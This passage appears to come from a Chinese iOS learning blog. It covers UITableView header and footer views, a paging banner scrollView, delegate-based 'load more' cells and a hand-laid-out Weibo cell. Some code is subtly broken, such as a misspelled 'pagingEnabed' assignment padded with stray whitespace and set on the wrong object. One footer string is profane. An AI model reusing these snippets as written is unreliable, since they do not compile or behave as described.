<p>如果将一个类和xib进行关联，那么实例化之后调用的方法就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-(void)awakeFromNib&#123;</div><div class="line">  NSLog(@&quot;调用此方法&quot;)；</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3-在headerView封装一个scrollView"><a href="#3-在headerView封装一个scrollView" class="headerlink" title="3.在headerView封装一个scrollView"></a>3.在headerView封装一个scrollView</h2><p>1.遵守UIScrollViewDelegate协议。</p>
<p>2.重写headerView的初始化方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">- (instancetype)initWithFrame:(CGRect)frame&#123;</div><div class="line">    </div><div class="line">    if(self = [super initWithFrame:frame])&#123;</div><div class="line">        </div><div class="line">        [self setupScrollView];</div><div class="line">        </div><div class="line">        [self setupPageController];</div><div class="line">   </div><div class="line">    &#125;    </div><div class="line">    return self;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>3.设置ScrollView的属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">- (void)setupScrollView&#123;</div><div class="line">    UIScrollView *scrollView = [[UIScrollView alloc]initWithFrame:self.bounds];</div><div class="line">    //赋值给属性</div><div class="line">    self.scrollView = scrollView;</div><div class="line">    //设置允许分页</div><div class="line">    self.pagingEnabed c                                                                                                                                                                                                                                                                                                          = YES;</div><div class="line">    //设置代理属性</div><div class="line">    scrollView.delegate = self;</div><div class="line">    //隐藏滚动条</div><div class="line">    scrollView.showsHorizontalScrollIndicator = NO;</div><div class="line">    </div><div class="line">    [self addSubview:scrollView];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>4.设置页面控制的属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">- (void)setupPageController&#123;</div><div class="line">    CGSize bannerViewSize = self.bounds.size;</div><div class="line">    </div><div class="line">    UIPageControl *pageControl = [[UIPageControl alloc]initWithFrame:CGRectMake(0, 0, bannerViewSize.width/2, 20)];</div><div class="line">    </div><div class="line">    self.pageControl = pageControl;</div><div class="line">    </div><div class="line">    pageControl.center = CGPointMake(bannerViewSize.width/2, bannerViewSize.height*0.9) ;</div><div class="line">    </div><div class="line">    pageControl.currentPageIndicatorTintColor = [UIColor  redColor];</div><div class="line">    </div><div class="line">    pageControl.pageIndicatorTintColor = [UIColor grayColor];</div><div class="line">    //设置分页的初始下标</div><div class="line">    pageControl.currentPage = 0;</div><div class="line">    </div><div class="line">    [self addSubview:pageControl];</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>5.设置传入的图片数组，重写setter方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">- (void)setImageArray:(NSArray *)imageArray&#123;</div><div class="line">    CGSize bannerViewSize = self.bounds.size;</div><div class="line">    </div><div class="line">    NSInteger count = imageArray.count;</div><div class="line">    </div><div class="line">    for( int i = 0 ; i &lt; count ; i++ )&#123;</div><div class="line">        </div><div class="line">        NSString *imageName = imageArray[i];</div><div class="line">        </div><div class="line">        UIImageView *imageView = [[UIImageView alloc]initWithFrame:CGRectMake(i*bannerViewSize.width, 0, bannerViewSize.width, bannerViewSize.height)];</div><div class="line">        </div><div class="line">        imageView.image = [UIImage imageNamed:imageName];</div><div class="line">        </div><div class="line">        [_scrollView addSubview:imageView];</div><div class="line">        </div><div class="line">        _scrollView.contentSize = CGSizeMake(count*bannerViewSize.width, 0);</div><div class="line">        //设置分页数</div><div class="line">        _pageControl.numberOfPages = count;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="4-自定义footerView"><a href="#4-自定义footerView" class="headerlink" title="4.自定义footerView"></a>4.自定义footerView</h2><p>临时隐藏应用的时候，可能会用到三种方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">view.alpha = 0; //view透明</div><div class="line">view.backgroundColor = [UIColor clearColor]; //view的背景透明</div><div class="line">view.hidden = YES; //整个view隐藏</div><div class="line">//从性能上看隐藏要好些，因为透明的话 GPU需要计算两层view的内容再显示</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">//定义一个新的类设置footerView</div><div class="line">#import &lt;UIKit/UIKit.h&gt;</div><div class="line">@class FooterView;</div><div class="line"></div><div class="line">@protocol FooterViewDelegate &lt;NSObject&gt;</div><div class="line"></div><div class="line">- (void)footerView:(FooterView *)footerView;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line"></div><div class="line">@interface FooterView : UIView</div><div class="line">//设置代理属性</div><div class="line">@property (nonatomic, weak) id&lt;FooterViewDelegate&gt; delegate;</div><div class="line"></div><div class="line">- (void)showLoadViewWith:(BOOL)isShow;</div><div class="line"></div><div class="line">@end</div><div class="line">  </div><div class="line">#import &quot;FooterView.h&quot;</div><div class="line">@interface FooterView()</div><div class="line"></div><div class="line">@property (nonatomic, weak) IBOutlet UIView *loadMoreView;</div><div class="line">@property (weak, nonatomic) IBOutlet UIActivityIndicatorView *activityView;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@implementation FooterView</div><div class="line"></div><div class="line">- (IBAction)didClickButton:(id)sender&#123;</div><div class="line">  //判断是否可以使用代理的方法</div><div class="line">    if([self.delegate respondsToSelector:@selector(footerView:)])&#123;</div><div class="line">        [self.delegate footerView:self];</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)showLoadViewWith:(BOOL)isShow&#123;</div><div class="line">    _loadMoreView.alpha = isShow;</div><div class="line">    if(isShow)</div><div class="line">        [_activityView startAnimating];</div><div class="line">    else</div><div class="line">        [_activityView stopAnimating];</div><div class="line">&#125;</div><div class="line">@end</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">//记得要将self赋值给footerView的代理属性，才能调用代理的方法</div><div class="line">//ViewController中的方法</div><div class="line">- (void)footerView:(FooterView *)footerView&#123;</div><div class="line">    </div><div class="line">    [footerView showLoadViewWith:YES];</div><div class="line">    //通过GCD延迟执行，再多线程中会细讲</div><div class="line">  dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^&#123;</div><div class="line">        [footerView showLoadViewWith:NO];</div><div class="line">        GroupsonsModel *model = [[GroupsonsModel alloc]init];</div><div class="line">        model.title = [NSString stringWithFormat:@&quot;哲学%d&quot;,arc4random_uniform(5)];</div><div class="line">        model.price = [NSString stringWithFormat:@&quot;%d&quot;,arc4random_uniform(34) ];</div><div class="line">        model.buyCount = [NSString stringWithFormat:@&quot;%d&quot;,arc4random_uniform(678) ];</div><div class="line">        NSIndexPath *indexPath = [NSIndexPath indexPathForRow:self.dataArray.count inSection:0];</div><div class="line">        </div><div class="line">        [self.dataArray addObject:model];</div><div class="line">        //添加cell，设置动画方式</div><div class="line">        [_tableView insertRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewRowAnimationLeft];</div><div class="line">        //使添加一个cell的时候滚动到底部</div><div class="line">        [_tableView  scrollToRowAtIndexPath:indexPath atScrollPosition:UITableViewScrollPositionBottom animated:YES];</div><div class="line"></div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>注意⚠️：通过在footerView可以直接拿到控制器来进行插入cell，但是十分不建议这种写法，要用代理的模式，来保证整个代码的过程分工明确，而不是逻辑混乱，每个子view只管好自己的事情，不要随便去调用控制器，善用代理的设计模式。以下这种方式是不可取的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">//在FooterView.h中加入一个控制器</div><div class="line">#import &lt;UIKit/UIKit.h&gt;</div><div class="line">@class FooterView, ViewController;</div><div class="line"></div><div class="line">@protocol FooterViewDelegate &lt;NSObject&gt;</div><div class="line"></div><div class="line">- (void)footerView:(FooterView *)footerView;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@interface FooterView : UIView</div><div class="line"></div><div class="line"></div><div class="line">@property (nonatomic, weak) id&lt;FooterViewDelegate&gt; delegate;</div><div class="line"></div><div class="line">// 决定是否要显示 loadView</div><div class="line">- (void)showLoadViewWith:(BOOL)isShow;</div><div class="line"></div><div class="line">@property (nonatomic, strong) ViewController *viewController;</div><div class="line"></div><div class="line">@end</div><div class="line">//点击按钮的时候直接将新创建的cell加入到控制器</div><div class="line">- (IBAction)didClickLoadButton:(id)sender &#123;</div><div class="line">    </div><div class="line">    // 1. 让loadMoreView 显示出来</div><div class="line">    _loadMoreView.alpha = 1;</div><div class="line">    // 2. 转菊花，也就是那个UIActivityIndicatorView</div><div class="line">    [_activityView startAnimating];</div><div class="line">#warning  以后不要这么做，使用代理通知到控制器来做</div><div class="line">    // 3. 插入数据</div><div class="line">    GrouponsModel *model = [[GrouponsModel alloc] init];</div><div class="line">    model.title = @&quot;0000000&quot;;</div><div class="line">    </div><div class="line">    // 放到数组</div><div class="line">    [self.viewController.dataArray addObject:model];</div><div class="line">    </div><div class="line">    // 4. 刷新tableView</div><div class="line">    [self.viewController.tableView reloadData];</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="5-实现简单的微博"><a href="#5-实现简单的微博" class="headerlink" title="5.实现简单的微博"></a>5.实现简单的微博</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div></pre></td><td class="code"><pre><div class="line">//为了避免使用代理，将main.storyboard中的View替换为TableView</div><div class="line">//并将ViewController继承的父类改成UITableView,将二者关联起来。</div><div class="line">//自定义微博的cell</div><div class="line">#import &lt;UIKit/UIKit.h&gt;</div><div class="line">@class WeiboModel;</div><div class="line"></div><div class="line">@interface WeiboViewCell : UITableViewCell</div><div class="line"></div><div class="line">@property (nonatomic, strong) WeiboModel *weiboModel;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">  </div><div class="line">#import &quot;WeiboViewCell.h&quot;</div><div class="line">#import &quot;WeiboModel.h&quot;</div><div class="line">@interface WeiboViewCell()</div><div class="line"></div><div class="line">@property (nonatomic, weak) UIImageView *userImageView;</div><div class="line"></div><div class="line">@property (nonatomic, weak) UIImageView *vipImageView;</div><div class="line"></div><div class="line">@property (nonatomic, weak) UIImageView *pictureImageView;</div><div class="line"></div><div class="line">@property  (nonatomic, weak) UILabel *nameLabel;</div><div class="line"></div><div class="line">@property (nonatomic, weak) UILabel *contentLabel;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line"></div><div class="line">@implementation WeiboViewCell</div><div class="line">- (instancetype)initWithStyle:(UITableViewCellStyle)style reuseIdentifier:(NSString *)reuseIdentifier&#123;</div><div class="line">    if(self = [super initWithStyle:style reuseIdentifier:reuseIdentifier])&#123;</div><div class="line">        [self setupUI];</div><div class="line">    &#125;</div><div class="line">    return self;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)setupUI&#123;</div><div class="line">    </div><div class="line">    UIImageView *userImageView = [[UIImageView alloc] init];</div><div class="line">    </div><div class="line">    self.userImageView = userImageView;</div><div class="line">    </div><div class="line">    [self.contentView addSubview:userImageView];</div><div class="line">    </div><div class="line">    UIImageView *vipImageView = [[UIImageView alloc] init];</div><div class="line">    </div><div class="line">    self.vipImageView = vipImageView;</div><div class="line">    </div><div class="line">    [self.contentView addSubview:vipImageView];</div><div class="line">    </div><div class="line">    UIImageView *pictureImageView = [[UIImageView alloc] init];</div><div class="line">    </div><div class="line">    self.pictureImageView = pictureImageView;</div><div class="line">    </div><div class="line">    [self.contentView addSubview:pictureImageView];</div><div class="line">    </div><div class="line">    UILabel *nameLabel = [[UILabel alloc] init];</div><div class="line">    </div><div class="line">    self.nameLabel = nameLabel;</div><div class="line">    </div><div class="line">    [self.contentView addSubview:nameLabel];</div><div class="line">    </div><div class="line">    UILabel *contentLabel = [[UILabel alloc] init];</div><div class="line">    </div><div class="line">    contentLabel.numberOfLines = 0;</div><div class="line">    </div><div class="line">    // 设置字体为15</div><div class="line">    contentLabel.font = [UIFont systemFontOfSize:15];</div><div class="line">    </div><div class="line">    self.contentLabel = contentLabel;</div><div class="line">    </div><div class="line">    [self.contentView addSubview:contentLabel];</div><div class="line">    </div><div class="line">    </div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)setWeiboModel:(WeiboModel *)weiboModel&#123;</div><div class="line">    self.userImageView.image = [UIImage imageNamed:weiboModel.icon];</div><div class="line">    </div><div class="line">    self.contentLabel.text = weiboModel.text;</div><div class="line">    </div><div class="line">    self.vipImageView.image = [UIImage imageNamed:@&quot;vip&quot;];</div><div class="line">    </div><div class="line">    self.nameLabel.text = weiboModel.name;</div><div class="line">    </div><div class="line">    if(weiboModel.picture)&#123;</div><div class="line">        self.pictureImageView.image = [UIImage imageNamed: weiboModel.picture];</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    CGFloat margin = 10;</div><div class="line">    CGFloat userImageWidth = 50;</div><div class="line">    </div><div class="line">    _userImageView.frame = CGRectMake(margin, margin, userImageWidth, userImageWidth);</div><div class="line">    </div><div class="line">    // 计算用户名称的frame</div><div class="line">    CGSize nameLabelMaxSize = CGSizeMake(MAXFLOAT, MAXFLOAT);</div><div class="line">    //返回真实文本的宽高</div><div class="line">    CGSize nameLabelRealSize = [weiboModel.name boundingRectWithSize:nameLabelMaxSize options:NSStringDrawingUsesLineFragmentOrigin attributes:@&#123;NSFontAttributeName:[UIFont systemFontOfSize:17]&#125; context:nil].size;</div><div class="line">    </div><div class="line">    </div><div class="line">    CGFloat nameLabelX = CGRectGetMaxX(_userImageView.frame) + margin;</div><div class="line">    //    CGFloat nameLabelHeight = 20;</div><div class="line">    //    CGFloat nameLabelWidth = 150;</div><div class="line">    CGFloat nameLabelY = (userImageWidth - nameLabelRealSize.height)/ 2 + margin;</div><div class="line">    </div><div class="line">    _nameLabel.frame = CGRectMake(nameLabelX, nameLabelY, nameLabelRealSize.width, nameLabelRealSize.height);</div><div class="line">    </div><div class="line">    // 计算vip imageView的 frame</div><div class="line">    CGFloat vipWidth = 20;</div><div class="line">    CGFloat vipX = CGRectGetMaxX(_nameLabel.frame) + margin;</div><div class="line">    CGFloat vipY = nameLabelY;</div><div class="line">    </div><div class="line">    _vipImageView.frame = CGRectMake(vipX, vipY, vipWidth, vipWidth);</div><div class="line">    </div><div class="line">    </div><div class="line"></div><div class="line">    // 计算文本的frame</div><div class="line">    CGFloat contentLabelWidth = self.contentView.frame.size.width - 2 * margin;</div><div class="line">    </div><div class="line">    // 给 显示的文本一个区域</div><div class="line">    CGSize contentMaxSize = CGSizeMake(contentLabelWidth, MAXFLOAT);</div><div class="line">    // NSFontAttributeName 字体的大小</div><div class="line">    NSDictionary *attributesDict = @&#123;NSFontAttributeName:[UIFont systemFontOfSize:17]&#125;;</div><div class="line">#warning 计算文本实际宽高的时候， 计算的字体大小要和label中设置的字体大小保持一致</div><div class="line">    // 根据限定的条件， 来计算text 真实的宽高，给文本一个矩形空间</div><div class="line">    CGSize contentRealSize =  [weiboModel.text boundingRectWithSize:contentMaxSize options:NSStringDrawingUsesLineFragmentOrigin attributes:attributesDict context:nil].size;</div><div class="line">    </div><div class="line">    </div><div class="line">    CGFloat contentLabelX = margin;</div><div class="line">    </div><div class="line">    CGFloat contentLabelY = CGRectGetMaxY(_userImageView.frame) + margin;</div><div class="line">    </div><div class="line">    //    CGFloat contentLabelHeight = 300;</div><div class="line">    </div><div class="line">    _contentLabel.frame = CGRectMake(contentLabelX, contentLabelY, contentRealSize.width, contentRealSize.height);</div><div class="line">    </div><div class="line">    // 配图的frame</div><div class="line">    CGFloat pictureWidth = 2 * userImageWidth;</div><div class="line">    CGFloat pictureX = margin;</div><div class="line">    CGFloat pictureY = CGRectGetMaxY(_contentLabel.frame) + margin;</div><div class="line">    </div><div class="line">    CGFloat cellHeight = 0;</div><div class="line">    </div><div class="line">    if (weiboModel.picture) &#123;</div><div class="line">        _pictureImageView.frame = CGRectMake(pictureX, pictureY, pictureWidth, pictureWidth);</div><div class="line">        </div><div class="line">        // cell的高度</div><div class="line">        cellHeight = CGRectGetMaxY(_pictureImageView.frame) + margin;</div><div class="line">        </div><div class="line">    &#125; else &#123;</div><div class="line">        _pictureImageView.frame = CGRectZero;</div><div class="line">        </div><div class="line">        // 没有配图， 就要按照文本的最大Y值</div><div class="line">        cellHeight = CGRectGetMaxY(_contentLabel.frame) + margin;   </div><div class="line">    &#125;   </div><div class="line">&#125;</div><div class="line">@end</div></pre></td></tr></table></figure>
<p>tableView的调用顺序：</p>
<p>首先有多少条数据就会调用多少次 heightForRowIndexPath:</p>
<p>之后就会调用cellForRowIndexPath:返回cell</p>
<p>但是每次调用的时候cellForRowIndexPath的时候都会重新调用一次heightForRowIndexPath:</p>
<p>所以如果需要将每一个微博的实际行高传给控制器显示出来的时候我们就需要一个frameModel，专门来设定控件的位置。</p>
<p><a href="https://github.com/Peterpan0927/iOS-test" target="_blank" rel="external">改良版代码</a></p>
<p>展示效果：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/0C39B15B-2AB5-4AC7-8929-2245F72376C4.png" alt="0C39B15B-2AB5-4AC7-8929-2245F72376C4.png" title="" class="">
                <p>0C39B15B-2AB5-4AC7-8929-2245F72376C4.png</p>
            </figure>
<hr>
<p>小结：在定义一个类的时候要尽量遵从单一原则，是这个类的功能的尽量的简单化，分而治之，在出现问题的时候可以快速的定位。</p>
]]></content>
      
        <categories>
            
            <category> TableView的进阶使用 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS-UI学习(五)]]></title>
      <url>/2017/06/03/iOS-UI%E5%AD%A6%E4%B9%A0-%E4%BA%94/</url>
      <content type="html"><![CDATA[<p>UI初步（五）<br><a id="more"></a></p>
<h1 id="UI基础Day6"><a href="#UI基础Day6" class="headerlink" title="UI基础Day6"></a>UI基础Day6</h1><h2 id="1-tableView基本使用"><a href="#1-tableView基本使用" class="headerlink" title="1.tableView基本使用"></a>1.tableView基本使用</h2><p>仅仅在main.storyboard中加入一个UITableView的控件，可以显示如下的效果：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/11A23983-B207-46FA-BD95-D941390BFF4A.png" alt="11A23983-B207-46FA-BD95-D941390BFF4A" title="" class="">
                <p>11A23983-B207-46FA-BD95-D941390BFF4A</p>
            </figure>
<p>其中每一个小横行被称作cell，我们可以使用代理的方式来添加每一行中的信息和cell的数量，注意，这两个方法在协议中是用@required来修饰的，表示必须实现，否则就会报错：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line">#import &quot;ViewController.h&quot;</div><div class="line"></div><div class="line">@interface ViewController ()&lt;UITableViewDataSource&gt;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@implementation ViewController</div><div class="line"></div><div class="line">- (void)viewDidLoad &#123;</div><div class="line">    [super viewDidLoad];</div><div class="line">&#125;</div><div class="line">//创建cell的数量</div><div class="line">- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section&#123;</div><div class="line">    //根据自定义返回每一节的cell数量和内容</div><div class="line">  	 NSInteger row = 0;</div><div class="line">    switch (section) &#123;</div><div class="line">        case 0:</div><div class="line">            row = 3;</div><div class="line">            break;</div><div class="line">        case 1:</div><div class="line">            row = 2;</div><div class="line">            break;</div><div class="line">        case 2:</div><div class="line">            row = 1;</div><div class="line">            break;</div><div class="line">        default:</div><div class="line">            break;</div><div class="line">    &#125;</div><div class="line">    return row;</div><div class="line">&#125;</div><div class="line">//编辑cell中的文本内容</div><div class="line">- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(nonnull NSIndexPath *)indexPath&#123;</div><div class="line">    UITableViewCell *cell = [[UITableViewCell alloc]initWithStyle:UITableViewCellStyleDefault reuseIdentifier:nil];</div><div class="line">    </div><div class="line">   switch (indexPath.section) &#123;</div><div class="line">        case 0:</div><div class="line">            switch (indexPath.row) &#123;</div><div class="line">                case 0:</div><div class="line">                    cell.textLabel.text = @&quot;Linux&quot;;</div><div class="line">                    break;</div><div class="line">                case 1:</div><div class="line">                    cell.textLabel.text = @&quot;Mac&quot;;</div><div class="line">                    break;</div><div class="line">                case 2:</div><div class="line">                    cell.textLabel.text = @&quot;Windows&quot;;</div><div class="line">                    break;</div><div class="line">            &#125;</div><div class="line">            break;</div><div class="line">        case 1:</div><div class="line">            switch (indexPath.row) &#123;</div><div class="line">                case 0:</div><div class="line">                    cell.textLabel.text = @&quot;QQ&quot;;</div><div class="line">                    break;</div><div class="line">                case 1:</div><div class="line">                    cell.textLabel.text = @&quot;WeChat&quot;;</div><div class="line">                    break;</div><div class="line">            &#125;</div><div class="line">            break;</div><div class="line">        case 2:</div><div class="line">            switch (indexPath.row) &#123;</div><div class="line">                case 0:</div><div class="line">                    cell.textLabel.text = @&quot;Baidu&quot;;</div><div class="line">                    break;</div><div class="line">            &#125;</div><div class="line">            break;</div><div class="line">   &#125;</div><div class="line">    return cell;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//创建cell的节数</div><div class="line">- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView&#123;</div><div class="line">    return 3;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//添加头部和尾部的信息</div><div class="line">- (NSString *)tableView:(UITableView *)tableView titleForFooterInSection:(NSInteger)section&#123;</div><div class="line">    return @&quot;fuck you&quot;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">-(NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section&#123;</div><div class="line">    return @&quot;我是Van&quot;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure>
<h3 id="plain"><a href="#plain" class="headerlink" title="plain:"></a>plain:</h3><p>​    如果设置了section的footer 和header上的title，在滚动的时候就会产生悬浮效果</p>
